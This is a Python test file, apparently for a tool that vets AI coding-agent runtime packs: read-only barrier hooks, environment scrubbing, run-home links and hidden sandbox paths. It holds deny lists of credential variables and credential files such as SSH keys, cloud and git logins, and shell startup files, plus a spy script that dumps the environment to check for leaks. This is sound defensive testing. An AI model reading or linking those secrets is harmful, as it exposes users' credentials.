                res = {"skills": dict(SKILLS_RES["skills"], link={"project": mode, "user": "none"})}
                self.import_pack(self.source(name, fake_runtime(name, resources=res)))
                out = self.check(name)
                self.assertIn("ok   link-skills: %s linked and unlinked" % mode, out)

    def test_a_hook_barrier_is_judged_through_the_guard_in_the_hooks_own_protocol(self):
        hook = {"input": "json-stdin", "tool_pointer": "/event/tool", "command_pointer": "/event/args/cmd", "cwd_pointer": "/workdir",
                "path_pointers": {"write": ["/event/args/target"], "read": ["/event/args/target"]},
                "tool_names": {"shell": ["run_shell"], "write": ["patch_file"], "read": ["open_file"]},
                "deny": {"exit": 0, "stdout": {"decision": "deny", "reason": "{reason}"}}, "allow": {"exit": 0}}
        d = fake_runtime(name="fakemd", barrier={"kind": "hook", "hook": hook}, capabilities={"read_only_barrier": {"value": "yes"}}, resources={})
        d["provider"] = "fakemd"
        self.import_pack(self.source("fakemd", d))
        out = self.check("fakemd")
        self.assertRegex(out, r"ok   barrier-hook: \d+ corpus calls through the guard in the hook's own protocol")
        self.assertIn("read_only_barrier                  verified (cases barrier-hook)", out)
        self.assertEqual(P.effective("fakemd", "local", "read_only_barrier"), "yes")

    def test_hook_data_that_can_never_refuse_fails_the_check(self):
        """A definition whose refusal looks like an allow (deny exit 0 with the reason on stderr, an empty stdout object, or the same exit as an
        allow) cannot be a barrier: the check names the problem and the barrier is not verified, so nothing silently allows everything."""
        base = {"input": "json-stdin", "tool_pointer": "/event/tool", "command_pointer": "/event/args/cmd", "cwd_pointer": "/workdir",
                "path_pointers": {"write": ["/event/args/target"], "read": ["/event/args/target"]},
                "tool_names": {"shell": ["run_shell"], "write": ["patch_file"], "read": ["open_file"]}}
        for i, (deny, allow) in enumerate((({"exit": 0, "stream": "stderr"}, {"exit": 0}), ({"exit": 0, "stdout": {}}, {"exit": 0}),
                                           ({"exit": 2, "stream": "stderr"}, {"exit": 2}))):
            with self.subTest(deny=deny, allow=allow):
                name = "badhook%d" % i
                hook = dict(base, deny=deny, allow=allow)
                d = fake_runtime(name=name, barrier={"kind": "hook", "hook": hook}, capabilities={"read_only_barrier": {"value": "yes"}}, resources={})
                d["provider"] = name
                self.import_pack(self.source(name, d))
                out = self.check(name, expect=1)
                self.assertRegex(out, r"FAIL barrier-hook: .*barrier\.hook\.")
                self.assertNotIn("read_only_barrier                  verified", out)
                self.assertNotEqual(P.effective(name, "local", "read_only_barrier"), "yes")

    def test_the_shipped_claude_code_hook_data_passes_its_own_corpus(self):
        from conformance import cases
        doc = P.definition("claude-code")
        res = cases.barrier_hook(doc, None, "claude-code", False, True)["barrier-hook"]
        self.assertEqual(res["status"], "pass", res)
        self.assertIn("corpus calls through the guard", res["notes"][0])

    def test_a_guard_that_lets_a_call_through_fails_the_corpus(self):
        from conformance import cases
        doc = P.definition("claude-code")
        allow_all = subprocess.CompletedProcess([], 0, "", "")
        with mock.patch.object(cases.subprocess, "run", return_value=allow_all):
            res = cases.barrier_hook(doc, None, "claude-code", False, True)["barrier-hook"]
        self.assertEqual(res["status"], "fail")
        self.assertRegex(res["notes"][0], r"\d+ of \d+ corpus calls went wrong")
        deny_all = subprocess.CompletedProcess([], 2, "", "qargi guard: no")
        with mock.patch.object(cases.subprocess, "run", return_value=deny_all):
            res = cases.barrier_hook(doc, None, "claude-code", False, True)["barrier-hook"]
        self.assertEqual(res["status"], "fail")                                  # a barrier that denies everything is not a read-only barrier either

    def adapter_pack(self, name, adapter_text=None):
        """A pack with the claude-code adapter and its stand-in transport, as a library pack named `name`."""
        d = P.definition("claude-code")
        d["resources"].pop("contract_addenda", None)
        d["provider"] = name
        d["adapter"] = "adapter"
        d["capabilities"] = {"read_only_barrier": {"value": "yes", "note": "n"}}
        d["barrier"] = {"kind": "adapter"}
        d["adapter_verbs"] = ["resolve", "dispatch-local", "barrier-check"]
        d["family"] = None
        d["models"] = {"catalog": "claude", "use": "alias"}
        src = os.path.join(self.src, name)
        os.makedirs(src)
        jwrite(os.path.join(src, "definition.json"), d)
        shutil.copy(os.path.join(LIB, "providers", "claude-code", "adapter"), os.path.join(src, "adapter"))
        if adapter_text is not None:
            fwrite(os.path.join(src, "adapter"), adapter_text)
        os.chmod(os.path.join(src, "adapter"), 0o755)
        shutil.copytree(os.path.join(HERE, "providers", "claude-code"), os.path.join(src, "conformance"), ignore=shutil.ignore_patterns("__pycache__"))
        return src

    def test_the_harness_runs_the_adapter_of_a_sealed_pack_against_its_stub_and_backs_the_barrier(self):
        src = self.adapter_pack("mycode")
        self.import_pack(src, exec_names="adapter,conformance/stub")
        rc, out, err = self.q("check", "mycode")
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("ok   barrier-adapter: harness case 8", out)
        self.assertIn("read_only_barrier                  verified (cases barrier-adapter)", out)
        self.assertEqual(P.effective("mycode", "local", "read_only_barrier"), "yes")

    def test_an_adapter_that_fails_the_harness_fails_the_check_and_verifies_nothing(self):
        src = self.adapter_pack("badcode", "#!/bin/sh\necho '{\"decision\": \"allow\", \"reason\": \"\"}'\nexit 0\n")
        self.import_pack(src, exec_names="adapter,conformance/stub")
        rc, out, err = self.q("check", "badcode")
        self.assertEqual(rc, 1, (out, err))
        self.assertIn("FAIL barrier-adapter: the adapter fails the conformance harness", out)
        self.assertEqual(P.effective("badcode", "local", "read_only_barrier"), "no")
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "badcode", "verified.json")))

    def test_the_harness_runs_the_adapter_with_a_scrubbed_environment_not_the_callers(self):
        seen = os.path.join(self.tmp, "adapter-env")
        spy = "#!/bin/sh\nenv > %s\necho '{}'\n" % seen
        self.import_pack(self.adapter_pack("spycode", spy), exec_names="adapter,conformance/stub")
        self.env.update(SECRET_TOKEN="leak-1", GH_TOKEN="leak-2", GITHUB_TOKEN="leak-3", SSH_AUTH_SOCK="/tmp/leak-4", OPENAI_API_KEY="leak-5", AWS_SECRET_ACCESS_KEY="leak-6",
                        LD_PRELOAD="/tmp/leak-7.so", PYTHONPATH="/tmp/leak-8")
        self.q("check", "spycode")
        self.assertTrue(os.path.exists(seen), "the adapter did not run")
        text = fread(seen)
        self.assertFalse("leak-" in text, "the adapter saw a variable of the caller")          # (not assertNotIn: it would print the whole environment)
        for name in ("SECRET_TOKEN", "GH_TOKEN", "GITHUB_TOKEN", "SSH_AUTH_SOCK", "OPENAI_API_KEY", "AWS_SECRET_ACCESS_KEY", "LD_PRELOAD", "PYTHONPATH"):
            self.assertNotRegex(text, r"(?m)^%s=" % name)
        self.assertNotIn("HOME=%s\n" % self.home, text)                           # not the caller's home either

    def test_pack_env_is_small_and_fixed(self):
        env = P.pack_env("/tmp/h", "/tmp/t")
        self.assertEqual(sorted(env), ["HOME", "LANG", "LC_ALL", "PATH", "TERM", "TMPDIR", "TZ"])
        self.assertEqual((env["HOME"], env["TMPDIR"]), ("/tmp/h", "/tmp/t"))
        self.assertTrue(all(p.startswith("/") for p in env["PATH"].split(os.pathsep)))
        with mock.patch.dict(os.environ, {"PATH": "rel/bin::/usr/bin:./x"}):
            self.assertEqual(P.pack_env("/h", "/t")["PATH"], "/usr/bin")

    def test_without_a_conformance_stub_the_adapter_is_not_run(self):
        src = self.adapter_pack("nostub")
        shutil.rmtree(os.path.join(src, "conformance"))
        self.import_pack(src, exec_names="adapter")
        out = self.check("nostub")
        self.assertIn("skip barrier-adapter: the pack has no conformance/stub", out)
        self.assertIn("could not run", out)


class EnvPass(LibraryBase):
    """dispatch.env_pass: the variables of the caller's environment a runtime's command receives. A few are never handed on, and the
    review shows the list."""

    DENIED = ("HOME", "PATH", "SHELL", "USER", "TMPDIR", "IFS", "BASH_ENV", "ENV", "SHELLOPTS", "PROMPT_COMMAND", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
              "PYTHONPATH", "PYTHONSTARTUP", "PERL5LIB", "RUBYOPT", "NODE_OPTIONS", "SSH_AUTH_SOCK", "SSH_ASKPASS", "GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN",
              "GITHUB_PAT", "GITLAB_TOKEN", "GIT_DIR", "GIT_SSH_COMMAND", "QARGI_HOME", "XDG_CONFIG_HOME", "GNUPGHOME", "EDITOR",
              "JDK_JAVA_OPTIONS", "FPATH", "ZDOTDIR", "KSH_ENV", "LUA_INIT", "LUA_PATH", "LUA_CPATH", "LESSOPEN", "GLIBC_TUNABLES", "NPM_CONFIG_REGISTRY",
              "npm_config_prefix", "GOFLAGS", "GOENV", "INPUTRC", "TERMINFO", "SUDO_ASKPASS")
    ALLOWED = ("OPENAI_API_KEY", "FAKECLI_API_KEY", "GEMINI_API_KEY", "XAI_API_KEY", "ANTHROPIC_API_KEY", "FAKE_MODE", "HTTPS_PROXY", "LANG")

    def test_the_names_that_must_not_reach_a_member_or_a_pack_are_refused(self):
        for n in self.DENIED:
            with self.subTest(n):
                self.assertIsInstance(P.env_pass_problem(n), str, n)
        for n in self.ALLOWED:
            with self.subTest(n):
                self.assertIsNone(P.env_pass_problem(n), n)

    def test_a_definition_that_hands_on_such_a_name_fails_its_check_and_cannot_be_imported(self):
        for names, bad in ((["FAKE_KEY", "HOME"], "HOME"), (["GH_TOKEN"], "GH_TOKEN"), (["LD_PRELOAD"], "LD_PRELOAD"), (["SSH_AUTH_SOCK"], "SSH_AUTH_SOCK")):
            with self.subTest(names):
                shutil.rmtree(os.path.join(self.src, "fakecli"), True)
                d = fake_runtime(dispatch={"mode": "command", "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "env_pass": names, "output": {"format": "text"}})
                self.assertTrue(any(("dispatch.env_pass" in m and bad in m) for lvl, m in P.validate2(d, "fakecli") if lvl == "fail"), P.validate2(d, "fakecli"))
                rc, out, err = self.q("import", self.source(doc=d))
                self.assertEqual(rc, 1, (out, err))
                self.assertIn("FAIL: dispatch.env_pass: %s" % bad, out)
                self.assertFalse(self.stored("fakecli"))

    def test_the_review_shows_what_is_handed_on_and_marks_the_names_that_look_like_credentials(self):
        d = fake_runtime(dispatch={"mode": "command", "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "env_pass": ["FAKECLI_API_KEY", "FAKE_MODE", "HTTPS_PROXY"],
                                   "output": {"format": "text"}})
        rc, out, err = self.q("import", self.source(doc=d))
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("environment handed to the command (env_pass): FAKECLI_API_KEY, FAKE_MODE, HTTPS_PROXY", out)
        self.assertRegex(out, r"warn: dispatch.env_pass hands FAKECLI_API_KEY to the command: the name looks like a credential")
        self.assertNotIn("FAKE_MODE to the command", out)

    def test_review_scan_lists_env_pass_even_for_a_name_the_definition_check_refuses(self):
        from conformance import review as R
        d = os.path.join(self.tmp, "t")
        os.makedirs(d)
        fwrite(os.path.join(d, "definition.json"), "{}")
        rv = R.scan(d, {"dispatch": {"env_pass": ["HOME", "GH_TOKEN", "OK_NAME"]}})
        self.assertEqual(rv["env_pass"], ["HOME", "GH_TOKEN", "OK_NAME"])
        self.assertIn("environment handed to the command (env_pass): HOME, GH_TOKEN, OK_NAME", "\n".join(R.lines(rv, "x")))
        self.assertEqual(R.scan(d, {})["env_pass"], [])


class RunHome(LibraryBase):
    """dispatch.home: the member's own home directory under the run home, named by a variable, with files of the user's home linked into it
    for the run. What may be named and linked is checked by the definition check and again by qargi local run (provider.home_problems)."""

    CMD = {"mode": "command", "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "output": {"format": "text"}}

    def with_home(self, home, **disp):
        return fake_runtime(dispatch=dict(self.CMD, home=home, **disp))

    def test_the_codex_runtime_links_only_its_sign_in(self):
        self.assertEqual(shipped("codex.json")["dispatch"]["home"], {"env": "CODEX_HOME", "dir": ".codex", "link": [{"from": "~/.codex/auth.json", "to": "auth.json"}]})
        self.assertEqual(P.home_problems(shipped("codex.json")["dispatch"]["home"]), [])
        self.assertEqual(fails(self.with_home({"env": "FAKECLI_HOME", "dir": ".fakecli"}), "fakecli"), [])                 # link is optional

    def test_refusals(self):
        ok_link = [{"from": "~/.fakecli/auth.json", "to": "auth.json"}]
        cases = (
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": ok_link, "copy": True}, "dispatch.home.copy: additional property is not allowed"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.fakecli/auth.json", "to": "auth.json", "mode": "copy"}]}, "dispatch.home.link[0].mode: additional property"),
            ({"dir": ".f"}, "missing required property 'env'"),
            ({"env": "FAKECLI_HOME"}, "missing required property 'dir'"),
            ({"env": "HOME", "dir": ".f"}, "dispatch.home.env: HOME is never set for a runtime"),
            ({"env": "PATH", "dir": ".f"}, "dispatch.home.env: PATH is never set"),
            ({"env": "GIT_DIR", "dir": ".f"}, "dispatch.home.env: GIT_DIR is never set"),
            ({"env": "QARGI_CONF", "dir": ".f"}, "dispatch.home.env: QARGI_CONF is never set"),
            ({"env": "XDG_CONFIG_HOME", "dir": ".f"}, "dispatch.home.env: XDG_CONFIG_HOME is never set"),
            ({"env": "LD_PRELOAD", "dir": ".f"}, "dispatch.home.env: LD_PRELOAD is never set"),
            ({"env": "TZ", "dir": ".f"}, "qargi local run sets it for every member"),
            ({"env": "FAKECLI_HOME", "dir": "../out"}, "dispatch.home.dir: '../out' is not a directory inside the run home"),
            ({"env": "FAKECLI_HOME", "dir": "/abs"}, "dispatch.home.dir: '/abs' is not a directory inside the run home"),
            ({"env": "FAKECLI_HOME", "dir": "a/./b"}, "is not a directory inside the run home"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "/etc/fakecli/auth.json", "to": "auth.json"}]}, "is not a plain path under the home"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/../other/auth.json", "to": "auth.json"}]}, "is not a plain path under the home"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~", "to": "auth.json"}]}, "is not a plain path under the home"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.qargi/config/credentials/marshal_ed25519", "to": "k"}]}, "qargi's own configuration, state and credentials"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.qargi", "to": "q"}]}, "qargi's own configuration"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.ssh/id_ed25519", "to": "k"}]}, "the user's ssh keys"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.gnupg/private-keys-v1.d/x.key", "to": "k"}]}, "the user's keys"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.git-credentials", "to": "c"}]}, "stored git logins"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.config/gh/hosts.yml", "to": "h"}]}, "a forge credential"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.aws/credentials", "to": "c"}]}, "a cloud credential"),
            # what runs as the user later: a file a runtime puts in place of its link is written back to the source
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.bashrc", "to": "c"}]}, "a startup file of the user's shell"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.profile", "to": "c"}]}, "a startup file of the user's shell"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.zshrc", "to": "c"}]}, "a startup file of the user's shell"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.config/autostart/x.desktop", "to": "c"}]}, "what the user's desktop starts"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.config/systemd/user/x.service", "to": "c"}]}, "what the user's service manager starts"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.local/bin/fakecli", "to": "c"}]}, "the user's own programs"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.fakecli/auth.json", "to": "sub/auth.json"}]}, "is not a plain file name"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.fakecli/auth.json", "to": ".."}]}, "is not a plain file name"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": ok_link + [{"from": "~/.fakecli/other.json", "to": "auth.json"}]}, "'auth.json' is linked twice"),
            ({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.f/%d" % i, "to": "f%d" % i} for i in range(9)]}, "more than the 8"),
        )
        for home, needle in cases:
            with self.subTest(needle):
                d = self.with_home(home)
                f = fails(d, "fakecli")
                self.assertTrue(any(needle in m for m in f), f)
                self.assertTrue(any(needle in m for m in P.home_problems(home)), P.home_problems(home))     # what qargi local run asks too
        self.assertEqual([m for m in fails(self.with_home({"env": "FAKECLI_HOME", "dir": ".f", "link": ok_link})) if "dispatch.home" in m], [])

    def test_the_variable_is_not_also_handed_on_and_only_a_command_runtime_has_a_run_home(self):
        d = self.with_home({"env": "FAKECLI_HOME", "dir": ".f"}, env_pass=["FAKECLI_HOME"])
        self.assertTrue(any("is also in dispatch.env_pass" in m for m in fails(d, "fakecli")), fails(d, "fakecli"))
        d = fake_runtime(dispatch={"mode": "in-session", "home": {"env": "FAKECLI_HOME", "dir": ".f"}})
        self.assertTrue(any("only a runtime that qargi local run starts" in m for m in fails(d, "fakecli")), fails(d, "fakecli"))

    def test_a_definition_with_a_refused_run_home_cannot_be_imported(self):
        d = self.with_home({"env": "FAKECLI_HOME", "dir": ".f", "link": [{"from": "~/.ssh/id_ed25519", "to": "k"}]})
        rc, out, err = self.q("import", self.source(doc=d))
        self.assertEqual(rc, 1, (out, err))
        self.assertIn("FAIL: dispatch.home.link[0].from: '~/.ssh/id_ed25519' is never linked into a run", out)
        self.assertFalse(self.stored("fakecli"))


class OutputUsage(unittest.TestCase):
    """dispatch.output.usage: the rule qargi local run reads the runtime's own token reports with, from its JSON lines on standard output."""

    RULE = {"select": {"/type": "turn.completed"}, "tokens": "/usage", "fields": ["input_tokens", "output_tokens"]}

    def with_output(self, output):
        return fake_runtime(dispatch={"mode": "command", "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "output": output})

    def test_a_rule_on_json_lines_passes(self):
        self.assertEqual([m for m in fails(self.with_output({"format": "jsonl", "usage": self.RULE}), "fakecli") if "output" in m], [])
        self.assertEqual(P.output_usage_problems({"format": "jsonl", "usage": self.RULE}, shape=True), [])

    def test_refusals(self):
        cases = (
            ({"format": "text", "usage": self.RULE}, "dispatch.output.format must be jsonl"),
            ({"usage": self.RULE}, "dispatch.output.format must be jsonl"),
            ({"format": "jsonl", "usage": {"select": {"/type": "x"}, "fields": ["a"]}}, "missing required property 'tokens'"),
            ({"format": "jsonl", "usage": {"tokens": "/usage"}}, "missing required property 'fields'"),
            ({"format": "jsonl", "usage": dict(self.RULE, tokens="usage")}, "dispatch.output.usage.tokens: 'usage' is not a JSON pointer"),
            ({"format": "jsonl", "usage": dict(self.RULE, model="model")}, "dispatch.output.usage.model: 'model' is not a JSON pointer"),
            ({"format": "jsonl", "usage": dict(self.RULE, select={"type": "x"})}, "dispatch.output.usage.select: 'type' is not a JSON pointer"),
            ({"format": "jsonl", "usage": dict(self.RULE, skip={"/a": {"b": 1}})}, "dispatch.output.usage.skip: '/a' is not a JSON pointer to a text"),
        )
        for output, needle in cases:
            with self.subTest(needle):
                f = fails(self.with_output(output), "fakecli")
                self.assertTrue(any(needle in m for m in f), f)
                self.assertTrue(any(needle in m for m in P.output_usage_problems(output, shape=True)), P.output_usage_problems(output, shape=True))

    def test_the_schema_and_local_run_refuse_an_unknown_key_or_a_wrong_shape(self):
        for output, needle in (({"format": "jsonl", "usage": dict(self.RULE, sum="all")}, "dispatch.output.usage.sum: additional property is not allowed"),
                               ({"format": "jsonl", "usage": dict(self.RULE, fields=[])}, "dispatch.output.usage.fields"),
                               ({"format": "json"}, "dispatch.output.format"),
                               ({"format": "jsonl", "lines": 3}, "dispatch.output.lines: additional property is not allowed")):
            with self.subTest(needle):
                f = fails(self.with_output(output), "fakecli")
                self.assertTrue(any(needle in m for m in f), f)
        self.assertTrue(any("sum: additional property" in m for m in P.output_usage_problems({"format": "jsonl", "usage": dict(self.RULE, sum="all")}, shape=True)))
        self.assertTrue(any("fields" in m for m in P.output_usage_problems({"format": "jsonl", "usage": dict(self.RULE, fields="input_tokens")}, shape=True)))

    def test_the_transcript_rule_shares_the_node_and_its_pointer_checks(self):
        sch = P.schema2()
        self.assertEqual(sch["$defs"]["res_transcripts"]["properties"]["usage"], {"$ref": "#/$defs/usage"})
        self.assertEqual(sch["$defs"]["provider"]["properties"]["dispatch"]["properties"]["output"]["properties"]["usage"], {"$ref": "#/$defs/usage"})
        d = copy.deepcopy(CODE)
        d["resources"]["transcripts"]["usage"]["tokens"] = "message/usage"
        self.assertTrue(any("resources.transcripts.usage.tokens: 'message/usage' is not a JSON pointer" in m for m in fails(d, "claude-code")), fails(d, "claude-code"))


class HiddenPaths(unittest.TestCase):
    """dispatch.hidden_paths: the places a runtime's sandbox hides from its member, and the run paths each class shows anyway. A run path the
    member of the class works with that lies there refuses the run (qargi local prepare and local run ask provider.hidden_run_paths)."""

    HP = {"prefixes": ["/hid"], "shown": {"write": ["clone", "out", "tmp"]}, "note": "the sandbox mounts its own /hid"}

    def with_hidden(self, hp, mode="command"):
        return fake_runtime(dispatch={"mode": mode, "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "output": {"format": "text"}, "hidden_paths": hp})

    def paths(self, run, tmp):
        return {"clone": run + "/clone", "contract": run + "/contract", "git": run + "/git", "out": run + "/out", "tmp": tmp}

    def test_a_declaration_passes_and_each_wrong_shape_is_refused(self):
        self.assertEqual([m for m in fails(self.with_hidden(self.HP), "fakecli") if "hidden_paths" in m], [])
        self.assertEqual(P.hidden_paths_problems({"mode": "command", "hidden_paths": self.HP}), [])
        cases = (
            (dict(self.HP, prefixes=["hid"]), "dispatch.hidden_paths.prefixes"),
            (dict(self.HP, prefixes=["/"]), "dispatch.hidden_paths.prefixes"),
            (dict(self.HP, prefixes=["/hid/"]), "dispatch.hidden_paths.prefixes"),
            (dict(self.HP, prefixes=["/a/../hid"]), "is not an absolute, normalised path other than /"),
            (dict(self.HP, prefixes=[]), "dispatch.hidden_paths.prefixes"),
            (dict(self.HP, shown={"review": ["clone"]}), "dispatch.hidden_paths.shown"),
            (dict(self.HP, shown={"write": ["task"]}), "dispatch.hidden_paths.shown.write"),
            ({"prefixes": ["/hid"]}, "note"),
            (dict(self.HP, note=""), "dispatch.hidden_paths.note"),
            (dict(self.HP, bind=["/x"]), "dispatch.hidden_paths.bind: additional property is not allowed"),
        )
        for hp, needle in cases:
            with self.subTest(needle=needle, hp=hp):
                f = fails(self.with_hidden(hp), "fakecli")
                self.assertTrue(any(needle in m for m in f), f)
                self.assertTrue(any(needle.split(":")[0] in m for m in P.hidden_paths_problems({"mode": "command", "hidden_paths": hp})))   # what local run asks too
        f = fails(self.with_hidden(self.HP, mode="in-session"), "fakecli")
        self.assertTrue(any("dispatch.hidden_paths: only a runtime that qargi local run starts" in m for m in f), f)

    def test_a_read_only_member_needs_its_clone_contract_and_git_wrapper_and_not_tmp(self):
        d = {"hidden_paths": self.HP}
        hits = P.hidden_run_paths(d, "read-only", self.paths("/hid/s/qargi.1", "/hid/qargi-run.1"))
        self.assertEqual([h[0] for h in hits], ["clone", "contract", "git"])                  # OUT and TMP: a read-only member writes neither
        self.assertEqual({h[3] for h in hits}, {"/hid"})
        self.assertEqual(P.hidden_run_paths(d, "read-only", self.paths("/srv/s/qargi.1", "/hid/qargi-run.1")), [])

    def test_a_write_member_is_refused_only_for_what_its_class_does_not_show(self):
        d = {"hidden_paths": self.HP}
        self.assertEqual([h[0] for h in P.hidden_run_paths(d, "write", self.paths("/hid/s/qargi.1", "/hid/qargi-run.1"))], ["contract", "git"])
        self.assertEqual(P.hidden_run_paths(d, "write", self.paths("/srv/s/qargi.1", "/hid/qargi-run.1")), [])   # its TMP is bound in: shown
        bare = {"hidden_paths": dict(self.HP, shown={})}
        self.assertEqual([h[0] for h in P.hidden_run_paths(bare, "write", self.paths("/srv/s/qargi.1", "/hid/qargi-run.1"))], ["tmp"])

    def test_the_prefix_is_a_whole_path_and_the_prefix_itself_counts(self):
        d = {"hidden_paths": dict(self.HP, shown={})}
        self.assertEqual(P.hidden_run_paths(d, "write", self.paths("/hidden/s/qargi.1", "/hidx")), [])
        self.assertEqual([h[0] for h in P.hidden_run_paths(d, "write", dict(self.paths("/srv/r", "/srv/t"), tmp="/hid"))], ["tmp"])
        self.assertEqual(P.hidden_run_paths({}, "read-only", self.paths("/hid/r", "/hid/t")), [])                  # nothing declared: nothing hidden
        self.assertEqual(P.hidden_run_paths({"hidden_paths": None}, "read-only", self.paths("/hid/r", "/hid/t")), [])

    def test_a_link_into_a_hidden_place_is_found_by_its_real_path(self):
        tmp = os.path.realpath(tempfile.mkdtemp(prefix="hid."))
        self.addCleanup(shutil.rmtree, tmp, True)
        os.makedirs(os.path.join(tmp, "hid", "s"))
        os.symlink(os.path.join(tmp, "hid", "s"), os.path.join(tmp, "lnk"))
        d = {"hidden_paths": dict(self.HP, prefixes=[os.path.join(tmp, "hid")])}
        hits = P.hidden_run_paths(d, "read-only", self.paths(os.path.join(tmp, "lnk", "qargi.1"), os.path.join(tmp, "t")))
        self.assertEqual([(h[0], h[2]) for h in hits], [(n, os.path.join(tmp, "hid", "s", "qargi.1", n)) for n in ("clone", "contract", "git")])
        msg = P.hidden_message("fakecli", "read-only", hits, d)
        self.assertIn("CONTRACT %s (its real path %s) lies under %s" % (os.path.join(tmp, "lnk", "qargi.1", "contract"), os.path.join(tmp, "hid", "s", "qargi.1", "contract"),
                                                                      os.path.join(tmp, "hid")), msg)

    def test_the_message_names_the_path_the_prefix_the_note_and_the_fix(self):
        d = {"hidden_paths": dict(self.HP, shown={})}
        msg = P.hidden_message("fakecli", "write", P.hidden_run_paths(d, "write", self.paths("/hid/s/qargi.1", "/hid/t")), d)
        self.assertIn("this write run of fakecli", msg)
        self.assertIn("hides /hid from the member's commands (dispatch.hidden_paths: the sandbox mounts its own /hid)", msg)
        self.assertIn("CONTRACT /hid/s/qargi.1/contract lies under /hid", msg)
        self.assertIn("TMP /hid/t lies under /hid", msg)
        self.assertIn("Nothing was started", msg)
        self.assertIn("--scratch on another filesystem", msg)
        self.assertIn("~/.cache/qargi-runs", msg)
        self.assertNotIn("/tmp", msg)                     # a scratch there is not shown to work for any runtime, so it is not advised
        self.assertIn("QARGI_RUN_TMP", msg)
        only_run = P.hidden_message("fakecli", "read-only", P.hidden_run_paths(d, "read-only", self.paths("/hid/s/qargi.1", "/srv/t")), d)
        self.assertNotIn("QARGI_RUN_TMP", only_run)

    def test_codex_refuses_a_run_under_dev_shm_except_a_write_run_whose_tmp_alone_is_there(self):
        def cli(*a):
            r = subprocess.run([sys.executable, "-I", os.path.join(LIB, "provider.py"), "hidden-paths", "codex", "local"] + list(a), capture_output=True, text=True)
            return r.returncode, r.stderr
        rc, err = cli("read-only", "/dev/shm/s/qargi.XXXXXX", "/dev/shm/qargi-run.XXXXXX")
        self.assertEqual(rc, 2, err)
        self.assertIn("this read-only run of codex", err)
        self.assertIn("CONTRACT /dev/shm/s/qargi.XXXXXX/contract lies under /dev", err)
        self.assertIn("--scratch on another filesystem", err)
        rc, err = cli("write", "/dev/shm/s/qargi.XXXXXX", "/dev/shm/qargi-run.XXXXXX")
        self.assertEqual((rc, "CONTRACT /dev/shm/s/qargi.XXXXXX/contract" in err, "  CLONE" in err, "  TMP" in err), (2, True, False, False), err)
        # the scratch on disk: the default TMP on /dev/shm is no matter, a read-only member writes none and a write member's is bound in
        self.assertEqual(cli("read-only", "/srv/scratch/qargi.XXXXXX", "/dev/shm/qargi-run.XXXXXX"), (0, ""))
        self.assertEqual(cli("write", "/srv/scratch/qargi.XXXXXX", "/dev/shm/qargi-run.XXXXXX"), (0, ""))
        self.assertEqual(cli("review", "/srv/scratch/qargi.XXXXXX", "/srv/t")[0], 2)                 # a class, not a role
        self.assertIn("usage:", cli("review", "/srv/scratch/qargi.XXXXXX", "/srv/t")[1])
        r = subprocess.run([sys.executable, "-I", os.path.join(LIB, "provider.py"), "hidden-paths", "claude-code", "local", "read-only",
                            "/dev/shm/s/qargi.XXXXXX", "/dev/shm/t"], capture_output=True, text=True)
        self.assertEqual((r.returncode, r.stderr), (0, ""))                                       # a runtime that declares nothing hides nothing


class Attest(LibraryBase):
    def setUp(self):
        super().setUp()
        self.import_pack(self.source())
        self.words = ("--asked", "ok to record the mcp check", "--did", "ran the mcp server once against a scratch dir", "--result", "pass",
                      "--cost-cents", "0", "--cleanup", "scratch dir removed")

    def test_without_the_facts_it_prints_the_ask_and_records_nothing(self):
        rc, out, _ = self.q("attest", "fakecli", "mcp")
        self.assertEqual(rc, 0)
        for needle in ("asked EACH TIME", "never pre-approved", "never runs or spends anything", "the exact command or API calls", "the smallest model and effort",
                       "the hard ceiling", "how the scratch resources are cleaned up", "nothing is recorded and nothing was run"):
            self.assertIn(needle, out)
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli")))
        rc, out, err = self.q("attest", "fakecli", "mcp", "--asked", "yes")
        self.assertEqual(rc, 2)
        self.assertIn("missing: --did, --result, --cost-cents, --cleanup", err)

    def test_the_plan_then_the_token_and_the_words_record_it_for_this_content_only(self):
        rc, out, err = self.q("attest", "fakecli", "mcp", *self.words)
        self.assertEqual(rc, 0, err)
        self.assertIn("cost 0 cents", out)
        self.assertIn("any edit makes it stale", out)
        tok = self.token(out)
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli")))
        rc, _, err = self.q("attest", "fakecli", "mcp", *self.words, "--approved", "go")
        self.assertEqual(rc, 1)
        self.assertIn("--plan is missing", err)
